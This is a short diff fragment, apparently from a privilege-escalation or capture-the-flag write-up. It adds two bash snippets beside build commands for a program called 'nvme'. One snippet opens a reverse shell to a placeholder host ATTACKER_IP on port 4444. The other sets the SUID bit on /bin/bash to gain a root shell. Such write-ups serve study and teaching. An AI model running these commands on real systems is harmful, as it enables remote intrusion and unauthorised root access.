@@ -127,6 +127,16 @@ int main() {
 ```
 
 ```
+#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
+
+```
+#!/bin/bash
+chmod u+s /bin/bash
+```
+
+```
 gcc nvme.c -o nvme
 chmod +x nvme
 ```
